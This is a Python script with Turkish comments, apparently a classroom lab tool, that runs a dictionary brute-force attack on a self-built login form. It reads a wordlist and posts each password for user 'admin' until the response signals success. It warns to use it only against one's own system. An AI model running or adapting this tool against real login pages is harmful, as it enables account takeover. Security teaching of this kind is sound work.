"""
Basit Brute-Force Saldırı Aracı  —  KİŞİ A (saldırı tarafı) bu dosyayı çalıştırır.

Hafta 1 sürümü: wordlist'teki parolaları TEK TEK dener, doğruyu bulunca durur.
(Hız/threading ve farklı saldırı modları HAFTA 2'de eklenecek.)

UYARI: Bu aracı SADECE kendi kurduğunuz login sistemine karşı çalıştırın.
       Başkasına ait sistemlere brute-force yapmak yasa dışıdır.

Çalıştırma:
    pip install requests
    python attack.py

Hedef kendi bilgisayarındaysa TARGET_URL = "http://localhost:5000/login"
Hedef Kişi B'nin bilgisayarındaysa onun IP'sini yaz:
    TARGET_URL = "http://192.168.1.34:5000/login"
"""

import requests
import time

# --- Ayarlar ----------------------------------------------------------------
TARGET_URL = "http://localhost:5000/login"   # <-- Kişi B'nin IP'siyle değiştir
USERNAME = "admin"                            # denenecek kullanıcı adı
WORDLIST = "wordlist.txt"                     # parola listesi


def load_passwords(path):
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


def try_password(username, password):
    """Login formuna bir deneme gönderir, başarılı mı diye bakar."""
    data = {"username": username, "password": password}
    resp = requests.post(TARGET_URL, data=data, timeout=5)
    # app.py başarılı girişte sayfaya "Giriş başarılı" yazıyor -> ondan anlıyoruz
    return "başarılı" in resp.text.lower() or "basarili" in resp.text.lower()


def main():
    passwords = load_passwords(WORDLIST)
    print(f"[SALDIRI] Hedef : {TARGET_URL}")
    print(f"[SALDIRI] Kullanıcı: {USERNAME}")
    print(f"[SALDIRI] {len(passwords)} parola denenecek\n")

    start = time.time()
    for i, pwd in enumerate(passwords, 1):
        found = try_password(USERNAME, pwd)
        status = "→ BAŞARILI ✔" if found else "→ başarısız"
        print(f"[SALDIRI] deneme {i:03d}  parola: {pwd:<15} {status}")

        if found:
            elapsed = time.time() - start
            print(f"\n[SONUÇ] Parola bulundu: '{pwd}'")
            print(f"[SONUÇ] {i} denemede, {elapsed:.1f} saniyede.")
            return

    print("\n[SONUÇ] Parola listede bulunamadı.")


if __name__ == "__main__":
    main()
